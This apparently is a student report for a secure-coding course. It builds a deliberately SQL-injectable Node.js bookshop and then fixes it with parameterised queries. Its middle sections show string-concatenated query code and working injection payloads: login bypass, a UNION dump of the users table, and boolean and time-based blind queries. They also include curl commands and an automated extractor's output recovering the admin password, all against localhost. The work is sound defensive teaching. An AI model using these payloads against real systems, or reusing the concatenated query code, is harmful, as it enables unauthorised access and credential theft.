<div align="center">

# DrukShelf: SQL Injection
### Building a SQL-Injection-Vulnerable Web Application and Defending It with Parameterised Queries

**WEB404: Secure Coding Practices · Assignment 3**

| | |
|---|---|
| **Name** | *[Your Name]* |
| **Student ID** | *[Your Student ID]* |
| **Programme** | *[Your Programme]* |
| **Institution** | *[Your College / University]* |
| **Submitted to** | *[Lecturer's Name]* |
| **Date of submission** | *[DD Month YYYY]* |

</div>

---

## Table of Contents

1. [Introduction](#1-introduction)
2. [Objectives](#2-objectives)
3. [Technologies Used](#3-technologies-used)
4. [Project Structure](#4-project-structure)
5. [SQL Injection Background](#5-sql-injection-background)
6. [System Design](#6-system-design)
7. [Application Walkthrough](#7-application-walkthrough)
8. [Vulnerable Implementation](#8-vulnerable-implementation)
9. [SQL Injection Attacks Demonstrated](#9-sql-injection-attacks-demonstrated)
10. [Why the Vulnerability Works](#10-why-the-vulnerability-works)
11. [Parameterised-Query Implementation](#11-parameterised-query-implementation)
12. [How the Protection Works](#12-how-the-protection-works)
13. [Testing Methodology](#13-testing-methodology)
14. [Vulnerable vs Protected Comparison](#14-vulnerable-vs-protected-comparison)
15. [Results](#15-results)
16. [Security Lessons Learned](#16-security-lessons-learned)
17. [Limitations and Future Improvements](#17-limitations-and-future-improvements)
18. [Conclusion](#18-conclusion)
19. [References](#19-references)
20. [Appendix A: How to Run the Project](#appendix-a-how-to-run-the-project)

---

## 1. Introduction

Almost every web application stores its data in a database and reaches that
data through **SQL** queries. When an application builds those queries by
**pasting user input straight into the query text**, it blurs the line between
*data* (what the user typed) and *code* (the instructions the database runs). An
attacker who notices that blur can type input that is deliberately read as SQL,
and so change the meaning of the query the application runs on its behalf. This
is **SQL injection (SQLi)**, catalogued by MITRE as **CWE-89** and sitting at
the top of the OWASP injection category for over a decade.

The impact is severe precisely because the database is where the valuable data
lives. A single injectable parameter can let an attacker **log in without a
password**, **read every row of every table** (including other users'
credentials), and in many deployments modify or destroy data outright — all
through an ordinary-looking search box or login form, with no special tools
required.

This assignment studies SQL injection in two parts:

1. **The vulnerability.** A small but realistic online bookshop,
   **DrukShelf**, is built so that its login form and its catalogue search
   build SQL by string concatenation. Five distinct classes of SQL-injection
   attack are then carried out against it, ending with a script that silently
   reads the administrator's password out of the database (Sections 8–10).
2. **The defence.** The application is switched to **parameterised (prepared)
   queries**. Every one of the same attacks is replayed and now fails, while
   legitimate logins and searches continue to work unchanged (Sections 11–15).

> **Ethics and scope.** The entire exercise runs on `localhost` in a controlled
> lab. The database is seeded with fictional data and rebuilt in memory on every
> start. The included attack script targets only the demo application the
> student also runs. Nothing here contacts, or provides any means of attacking,
> any real or third-party system. SQL injection is demonstrated here solely to
> understand and prevent it.

---

## 2. Objectives

1. **Explain** what SQL injection is, the main categories it falls into, and
   why string-concatenated queries make it possible.
2. **Build** a functional web application with a login form and a
   database-backed search feature.
3. **Implement** the application first *without* protection and demonstrate a
   range of working, controlled injection attacks: authentication bypass,
   UNION-based extraction, error-based disclosure, and boolean- and time-based
   *blind* injection.
4. **Automate** a blind attack to show that the whole database is readable even
   when no data is ever displayed on screen.
5. **Implement** the correct defence — parameterised queries — across the exact
   same application.
6. **Demonstrate** that every attack that succeeded against the vulnerable
   version now fails against the protected version, without breaking normal use.
7. **Test** both versions and present the results as HTTP responses, recovered
   data, and response timings.
8. **Reflect** on the lessons, the remaining limitations, and complementary
   defences (least privilege, hashing, input validation).

---

## 3. Technologies Used

| Technology | Role in the project |
|------------|---------------------|
| **Node.js (≥ 20)** | JavaScript runtime for the application and the attack script. |
| **Express 5** | Minimal web framework handling routes and form parsing. |
| **sql.js (SQLite in WebAssembly)** | A *real* SQL engine running in memory, with no native build step and no separate database server — the whole lab installs with one `npm install`. |
| **cookie-parser** | Reads the small session cookie set after login. |
| **Node `crypto` (built-in)** | Generates unguessable session ids. |
| **cross-env** | Sets the `SQLI_PROTECTION` environment variable identically across Windows / macOS / Linux. |
| **HTML + CSS (server-rendered)** | Plain templates so the exact SQL sent to the database is printed on the page for inspection. |

No ORM and no query-builder library is used: both the vulnerable concatenation
and the parameterised fix are written by hand so that every step is inspectable.

---

## 4. Project Structure

```
Assignment_3/
├── package.json             # scripts: start:vulnerable / start:protected / attack:extract
├── README.md                # this report
├── instruction.md           # how to run it and which screenshots to capture
├── src/
│   ├── config.js            # reads SQLI_PROTECTION and flips the security posture
│   ├── db.js                # builds the in-memory SQLite DB and seeds books + users
│   ├── queries.js           # THE HEART: vulnerable vs parameterised query builders
│   ├── views.js             # server-rendered HTML, incl. the "SQL sent to the DB" panel
│   └── server.js            # Express routes (login, catalogue search, logout)
├── attacker/
│   └── extract.js           # automated boolean-based BLIND extractor (local lab tool)
├── public/
│   ├── style.css            # styling + light/dark theme; red = vulnerable, green = protected
│   ├── app.js               # progressive enhancement: light/dark theme toggle
│   ├── theme.js             # applies the saved theme before paint (no flash)
│   └── favicon.svg
└── screenshots/             # your captured evidence for this report
```

The only file that differs in behaviour between the two versions is
`src/queries.js`; everything else is shared.

---

## 5. SQL Injection Background

### 5.1 The root cause

A SQL query is a string of *code*. Consider a login check written by
concatenation:

```js
"SELECT id, username, role FROM users " +
"WHERE username = '" + username + "' AND password = '" + password + "'"
```

If the user submits the username `admin` and password `1234`, the database
receives:

```sql
SELECT id, username, role FROM users WHERE username = 'admin' AND password = '1234'
```

But the quotes that delimit the string literal came from the *developer*, while
the text inside them came from the *user*. If the user types a quote of their
own, they can close the literal early and have the rest of their input parsed as
SQL. Submitting the username `' OR 1=1-- ` produces:

```sql
SELECT id, username, role FROM users WHERE username = '' OR 1=1--  ' AND password = '...'
```

The `--` starts a SQL comment, so the password check is discarded and `1=1` is
always true: the query now returns **every** user. The user's *data* became
query *code*. That is the entire vulnerability.

### 5.2 The categories demonstrated in this report

SQL injection is usually classified by *how the attacker gets the answer back*:

| Category | Sub-type | How the data comes back | Demonstrated in |
|----------|----------|-------------------------|-----------------|
| **In-band** | **Authentication bypass** | The injected logic changes the application's decision directly. | §9.1 |
| **In-band** | **UNION-based** | Extra rows from other tables are appended to the normal result and displayed. | §9.2 |
| **In-band** | **Error-based** | A provoked database error message, shown by the app, leaks information. | §9.3 |
| **Inferential (blind)** | **Boolean-based** | No data is shown; the attacker infers it bit-by-bit from *whether the page changes*. | §9.4 |
| **Inferential (blind)** | **Time-based** | No data and no visible change; the attacker infers it from *how long the response takes*. | §9.5 |

A sixth technique, **out-of-band** (exfiltrating data over DNS/HTTP), is out of
scope for a local lab but is described briefly in §17.

---

## 6. System Design

DrukShelf is an online bookshop with two database-backed features that between
them cover the whole attack surface this assignment needs:

```
                      ┌──────────────────────────────────────────┐
  Browser ──GET──▶    │  /catalog?q=<term>                        │
                      │    builds a SELECT over the `books` table │──▶ sql.js
  Browser ──POST─▶    │  /login  (username, password)             │    (SQLite
                      │    builds a SELECT over the `users` table │     in WASM)
                      └──────────────────────────────────────────┘
```

The database has two tables (see `src/db.js`):

- **`books`** — the *public* catalogue (id, title, author, category, price,
  stock). The search box is *supposed* to read this table.
- **`users`** — the *private* accounts table (id, username, password, email,
  role). The application never intends to show this table to a visitor. It is
  the prize the injection attacks go after.

The single environment variable `SQLI_PROTECTION` selects, at start-up, whether
`src/queries.js` builds its SQL by **concatenation** (`off`, vulnerable) or with
**bound parameters** (`on`, protected). A coloured banner at the top of every
page — **red** for vulnerable, **green** for protected — makes the running mode
unmistakable in screenshots.

> **Deliberately bad practice, flagged as such.** The `users` table stores
> passwords in **plaintext**. Real systems must store only a salted hash (e.g.
> bcrypt/argon2). Plaintext is used here only so the UNION and blind demos have
> something human-readable to recover; §16 returns to this as a defence-in-depth
> lesson.

---

## 7. Application Walkthrough

1. **Catalogue (`/catalog`).** The landing page shows the whole book catalogue
   as cards and a search box above it. Searching `clean` returns *Clean Code*.
   Every search prints, below the results, the **exact SQL string the database
   received**, with the **user-supplied part highlighted** when it was
   concatenated into the query — the key teaching aid of the whole app.
2. **Login (`/login`).** A staff login form. On a successful login the account's
   username and role appear in the header; the executed SQL is shown on the page
   so an injected payload stays visible.
3. **Attack Lab.** Both pages carry a collapsible *Attack Lab* panel with
   **one-click payload buttons**, so the attacks can be demonstrated without
   hand-typing long injection strings. The same buttons succeed in vulnerable
   mode and are harmlessly neutralised in protected mode — the exact contrast
   the report relies on. (It is a teaching aid, clearly labelled as such, not a
   feature of a real shop.)
4. **Mode banner & theme.** The red/green banner shows whether concatenation or
   parameterisation is in force; a light/dark toggle sits in the header.

---

## 8. Vulnerable Implementation

In vulnerable mode (`SQLI_PROTECTION=off`) both queries are assembled by string
concatenation in `src/queries.js`:

```js
// Authentication (login)
sql = "SELECT id, username, role FROM users " +
      "WHERE username = '" + username + "' AND password = '" + password + "'";

// Catalogue search
sql = "SELECT id, title, author, category, price FROM books " +
      "WHERE title LIKE '%" + term + "%' ORDER BY id";
```

In both cases the user-supplied value is placed *inside the SQL string*, between
single quotes that the developer wrote. Nothing stops the user's text from
containing a quote of its own and escaping into the surrounding SQL.

**Screenshot — the starting state and the concatenated query:**

![Vulnerable catalogue, clean search](screenshots/01-vulnerable-catalog.png)
![The concatenated SQL printed on the page](screenshots/02-vulnerable-search-sql.png)

The red "SQL sent to the database" panel shows the user's term sitting *inside*
the query text. That is the visual signature of an injectable query.

---

## 9. SQL Injection Attacks Demonstrated

All payloads below were run against the vulnerable build. Each is reproducible
from the browser or with `curl`; §13 lists the exact commands.

### 9.1 Authentication bypass (in-band)

**Goal:** log in as the administrator without knowing the password.

**Payload** — in the *username* field (password left as anything):

```
' OR 1=1-- 
```

The login query becomes:

```sql
SELECT id, username, role FROM users WHERE username = '' OR 1=1--  ' AND password = '...'
```

`1=1` is always true and the `--` comments out the password check, so the query
returns **all 4 users** and the application logs the attacker in as the first
one — `admin` (role `administrator`).

A second, more surgical payload targets a known account by commenting out only
the password:

```
admin'-- 
```

→ `WHERE username = 'admin'--  ' AND password = '...'` → authenticated as
`admin` with no password at all.

> **A subtle but instructive result.** The textbook payload `' OR '1'='1`
> **without** a comment does **not** bypass *this* login, because SQL evaluates
> `AND` before `OR`: the query reduces to
> `username='' OR ('1'='1' AND password='...')`, and the password clause still
> has to hold. You must either comment the password check out with `--` or make
> the whole `AND` group true. This shows that a successful injection depends on
> the exact query structure, not on a memorised "magic string".

![Authentication bypass](screenshots/03-auth-bypass.png)

### 9.2 UNION-based extraction (in-band)

**Goal:** read the private `users` table through the public catalogue search.

A `UNION SELECT` appends the rows of a second query to the first. It requires
the same number of columns; the catalogue query returns **five**
(id, title, author, category, price), so the injected query must also select
five.

**Payload** — in the search box:

```
zzz' UNION SELECT id, username, password, email, role FROM users-- 
```

The search query becomes:

```sql
SELECT id, title, author, category, price FROM books
WHERE title LIKE '%zzz' UNION SELECT id, username, password, email, role FROM users--  %'
```

No book contains `zzz`, so the first query returns nothing and the result table
is filled **entirely with the users table**: every username, **plaintext
password**, email and role is displayed in the columns labelled *title / author /
category / price*.

![UNION-based dump of the users table](screenshots/04-union-dump.png)

### 9.3 Error-based disclosure (in-band)

**Goal:** make the database emit an error and have the application leak it.

**Payload** — a single unbalanced quote in the search box:

```
'
```

This produces `... LIKE '%'%'`, which is syntactically invalid. The engine
throws, and the vulnerable application prints the raw message to the page:

```
unrecognized token: "' ORDER BY id"
```

Even this terse message confirms to an attacker that input reaches the SQL
parser unescaped and reveals the engine's behaviour. Richer engines (MySQL,
SQL Server) can be coaxed into returning table and column *names* inside such
error text, turning error messages into a full data-exfiltration channel.

![Error-based disclosure](screenshots/05-error-based.png)

### 9.4 Boolean-based blind injection (inferential)

**Goal:** read data even when the application shows **no** query output and
**no** error — only whether a search *returned something or not*.

The oracle is built from a condition that is true or false:

```
zzzzz' OR (SELECT substr(password,1,1) FROM users WHERE username='admin')='D'-- 
```

If the admin password's first character is `D`, the `OR` is true and the whole
catalogue is returned ("8 rows"); otherwise the search matches nothing
("No books matched"). "Results vs no results" is a one-bit answer, and by asking
enough such questions — one per character, narrowed with a binary search — the
entire password can be reconstructed.

![Boolean-based blind: a true condition returns rows](screenshots/06-boolean-blind.png)

### 9.5 Time-based blind injection (inferential)

**Goal:** read data when the page looks **identical** whatever the answer — the
only observable difference is the *response time*.

SQLite has no `SLEEP()`, but hashing a large random blob costs measurable time,
and a `CASE` runs it only when the condition is true:

```
zzz' OR CASE WHEN (SELECT unicode(substr(password,1,1)) FROM users
WHERE username='admin')>64 THEN like('A',upper(hex(randomblob(20000000)))) ELSE 0 END-- 
```

Measured on the lab machine:

| Condition | Response time |
|-----------|---------------|
| **True** (heavy blob runs) | **≈ 2.25 s** |
| **False** (skipped) | **≈ 0.004 s** |

The exact figures depend on the machine and on the `randomblob` size (raise or
lower `20000000` to lengthen or shorten the delay), but the *gap* — two to three
orders of magnitude — is a completely reliable oracle. The attacker learns the
bit purely from the clock, with the page content unchanged.

![Time-based blind: true vs false response time](screenshots/08-time-based.png)

### 9.6 Automated blind extraction

The boolean oracle of §9.4 is tedious by hand but trivial to script.
`attacker/extract.js` binary-searches every character of the admin password by
repeatedly querying the catalogue and checking only whether results came back:

```
$ npm run attack:extract

Oracle confirmed: "1=1" -> results, "1=2" -> no results.
Password length: 15 characters
Extracting password: Dr#k_R00t_2024!
────────────────────────────────────────────
  Recovered password for 'admin':  Dr#k_R00t_2024!
  HTTP requests sent:                 111
────────────────────────────────────────────
```

**The 15-character admin password was recovered in 111 requests — and it never
once appeared on any page.** This is the point of the whole assignment: an
injectable parameter exposes the *entire* database even when the application is
careful never to display sensitive data.

![Automated blind extractor recovering the password](screenshots/07-blind-extractor.png)

---

## 10. Why the Vulnerability Works

Every attack above has the **same single cause**: user input is concatenated
into the SQL string, so the database cannot tell the developer's SQL apart from
the user's text.

```
Intended:  SELECT ... WHERE title LIKE '%  [DATA]  %'
Attack:    SELECT ... WHERE title LIKE '%  ' UNION SELECT ... --  %'
                                          └──────── CODE ───────┘
```

Once a quote from the input closes the literal, the parser treats everything
after it as further SQL. Escaping quotes by hand is **not** a reliable fix —
encodings, numeric contexts, and `LIKE` wildcards all create bypasses, and one
missed spot reopens the hole. The only robust fix is to stop mixing data into
the query text at all.

---

## 11. Parameterised-Query Implementation

In protected mode (`SQLI_PROTECTION=on`) `src/queries.js` uses **parameterised
(prepared) statements**. The SQL text is fixed and contains `?` placeholders;
the user's values are sent to the engine *separately* and bound to those
placeholders:

```js
// Authentication (login) — protected
sql    = 'SELECT id, username, role FROM users WHERE username = ? AND password = ?';
params = [username, password];

// Catalogue search — protected
sql    = "SELECT id, title, author, category, price FROM books " +
         "WHERE title LIKE '%' || ? || '%' ORDER BY id";
params = [term];
```

The placeholders are part of the **fixed** query; the term is concatenated into
the `LIKE` pattern by the **database**, not by us. The engine compiles the query
*first*, then treats each bound value purely as data for an existing slot.

**Screenshot — the same search, now parameterised:**

![Protected search: fixed SQL plus bound parameter](screenshots/09-protected-search-sql.png)

The green panel shows the query and the bound parameter as **two separate
things** — the structural difference that defeats every attack in §9.

---

## 12. How the Protection Works

With parameterised queries, a quote in the input is just the character
`'`. There is no string literal for it to escape, because the value is never
spliced into the SQL text at all. Each §9 payload collapses:

| Payload | Vulnerable result | Protected result |
|---------|-------------------|------------------|
| `' OR 1=1-- ` (login) | Returns all users → logged in as admin | Searches for a *user literally named* `' OR 1=1-- ` → **no match → login refused** |
| `zzz' UNION SELECT ... users-- ` | Dumps the users table | Searches for that whole string as a *book title* → **No books matched** |
| `'` (search) | Database error leaked | Searches for a title containing an apostrophe → returns *The Web Application Hacker's Handbook* → **no error** |
| Blind payloads | Oracle works; password extracted | Treated as a literal title → always "No books matched" → **oracle is dead** |

That last row is worth stressing: against the protected build, running
`npm run attack:extract` prints *"Injection does not appear to work here … the
server is most likely running in PROTECTED mode"* — the extractor fails because
the quote never escapes.

> **Note on layers.** The app also HTML-escapes output (`esc()` in `views.js`),
> which prevents XSS — a *different* vulnerability at a *different* layer.
> Output encoding does **not** stop SQL injection, and parameterisation does
> **not** stop XSS. Each layer needs its own defence.

---

## 13. Testing Methodology

Both builds were tested from the browser and reproducibly with `curl`. Start the
relevant server first (see Appendix A), then:

```powershell
# --- 9.1 Authentication bypass (run against each mode) ---
curl.exe -s http://localhost:3000/login --data-urlencode "username=' OR 1=1-- " --data-urlencode "password=x" | Select-String "Authenticated as","Invalid"

# --- 9.2 UNION-based extraction ---
curl.exe -s -G http://localhost:3000/catalog --data-urlencode "q=zzz' UNION SELECT id,username,password,email,role FROM users-- " | Select-String "Dr#k_R00t","No books matched"

# --- 9.3 Error-based disclosure ---
curl.exe -s -G http://localhost:3000/catalog --data-urlencode "q='" | Select-String "database error","unrecognized token"

# --- 9.5 Time-based blind (watch the time_total) ---
curl.exe -s -G -o NUL -w "time=%{time_total}s`n" http://localhost:3000/catalog --data-urlencode "q=zzz' OR CASE WHEN (SELECT unicode(substr(password,1,1)) FROM users WHERE username='admin')>64 THEN like('A',upper(hex(randomblob(20000000)))) ELSE 0 END-- "

# --- 9.6 Automated blind extraction ---
npm run attack:extract
```

Each command is run twice — once with the server in `start:vulnerable` and once
in `start:protected` — and the two outcomes are compared. The results are in
§15.

---

## 14. Vulnerable vs Protected Comparison

| Attack (§) | Payload shape | Vulnerable build | Protected build |
|------------|---------------|------------------|-----------------|
| Auth bypass (9.1) | `' OR 1=1-- ` | **Logged in as admin** | Login refused |
| UNION dump (9.2) | `… UNION SELECT … FROM users-- ` | **Entire users table leaked** | "No books matched" |
| Error-based (9.3) | `'` | **DB error leaked to page** | Normal result, no error |
| Boolean blind (9.4) | `… OR (substr(...))='x'-- ` | **Oracle works** | Oracle dead (literal search) |
| Time-based blind (9.5) | `… CASE WHEN … randomblob …` | **~2.25 s vs ~0.004 s** | Constant, fast |
| Automated (9.6) | `extract.js` | **Password recovered (111 reqs)** | Extractor reports "protected" |
| Legitimate login | `yeshi` / `summer2023` | Works | **Works (unchanged)** |
| Legitimate search | `clean` | Works | **Works (unchanged)** |

The defence blocks every attack **and** leaves normal use untouched — the mark
of a correct fix rather than a blunt filter.

---

## 15. Results

- **Vulnerable build:** all five attack classes succeeded. The administrator
  password `Dr#k_R00t_2024!` was obtained three independent ways — directly via
  the UNION dump, and inferentially via the boolean and time-based oracles — and
  the login was bypassed without any password.
- **Protected build:** every payload was neutralised. Injected quotes were
  treated as ordinary characters, so attacks became harmless literal searches or
  refused logins, while legitimate logins and searches behaved exactly as before.
- **Key metric:** the automated extractor recovered a 15-character password in
  **111 HTTP requests** against the vulnerable build and **0 characters** against
  the protected build.

![Protected: UNION payload blocked](screenshots/10-protected-union-blocked.png)
![Protected: auth bypass blocked](screenshots/11-protected-auth-blocked.png)
![Protected: legitimate login still works](screenshots/12-protected-legit.png)
![Protected: extractor reports protection](screenshots/13-protected-extractor-blocked.png)

---

## 16. Security Lessons Learned

1. **Parameterised queries are the primary defence.** Separating code from data
   at the query layer removes the entire vulnerability class, not just the
   payloads you thought of.
2. **Never build SQL by concatenation**, and don't rely on hand-escaping quotes;
   it is fragile and routinely bypassed.
3. **Defence in depth matters.** Even with injection present, several other
   mistakes made it worse and should be fixed independently:
   - **Hash passwords** (bcrypt/argon2) so a dump yields no usable credentials.
   - **Least-privilege database accounts** so a read-only web user cannot write
     or drop tables.
   - **Do not leak error messages** to users; log them server-side and show a
     generic message.
   - **Validate and constrain input** (type, length, allow-lists) as an extra
     layer, though never as the only one.
4. **Blind injection is still total compromise.** Hiding data from the page does
   not protect it; a boolean or timing side-channel is enough to read everything.
5. **Vulnerabilities are layered.** Fixing SQLi does not fix XSS, and vice
   versa; each layer needs its own, correct defence.

---

## 17. Limitations and Future Improvements

- **Single engine.** The lab uses SQLite (via sql.js). Error-based injection is
  far richer on MySQL/SQL Server (`extractvalue`, `CAST`-based errors), and
  those engines provide a real `SLEEP()` for time-based attacks. The techniques
  shown here transfer directly; only the exact payloads change.
- **Plaintext passwords** are intentional for readable demos and must never
  appear in real systems (§16).
- **No stored procedures / second-order injection.** A natural extension is
  *second-order* SQLi, where a payload is stored safely and later used unsafely.
- **No out-of-band channel.** Real engagements may exfiltrate over DNS/HTTP when
  no in-band or inferential channel exists; this is out of scope for an offline
  lab.
- **No ORM comparison.** A follow-up could show how query builders / ORMs
  parameterise by default, and how raw-SQL "escape hatches" reintroduce risk.

---

## 18. Conclusion

SQL injection comes down to one mistake — letting user input become part of the
query *code* — and a single correct fix: **parameterised queries**, which keep
user input as *data*. This assignment built one small application, demonstrated
five distinct classes of SQL injection against it (including a script that read
the admin password straight out of the database without ever displaying it), and
then defeated every one of those attacks by changing only *how the queries are
built*. The side-by-side result — identical application, opposite security
outcomes — shows that SQL injection is not an unavoidable hazard of
database-backed web apps but a direct, preventable consequence of how the SQL is
constructed.

---

## 19. References

1. MITRE. *CWE-89: Improper Neutralization of Special Elements used in an SQL
   Command ('SQL Injection')*. https://cwe.mitre.org/data/definitions/89.html
2. OWASP. *SQL Injection* and *SQL Injection Prevention Cheat Sheet*.
   https://owasp.org/www-community/attacks/SQL_Injection /
   https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html
3. OWASP. *Blind SQL Injection*.
   https://owasp.org/www-community/attacks/Blind_SQL_Injection
4. PortSwigger Web Security Academy. *SQL injection*.
   https://portswigger.net/web-security/sql-injection
5. SQLite. *Query Language: expressions, `LIKE`, `randomblob`, CTEs*.
   https://www.sqlite.org/lang.html
6. OWASP. *Password Storage Cheat Sheet* (hashing with bcrypt/argon2).
   https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html

---

## Appendix A: How to Run the Project

Full step-by-step instructions, including which screenshots to capture, are in
[`instruction.md`](instruction.md). In brief:

```powershell
# 1. Install dependencies (once)
npm install

# 2a. Run the VULNERABLE version (red banner)
npm run start:vulnerable      # http://localhost:3000

# 2b. …or the PROTECTED version (green banner)
npm run start:protected

# 3. Run the automated blind extractor against whichever version is running
npm run attack:extract
```

Requires **Node.js 20+**. Everything runs on `localhost`; the in-memory database
is rebuilt on every start, so attacks never cause lasting damage.

<div align="center">

---

*Submitted in partial fulfilment of WEB404: Secure Coding Practices.*

</div>
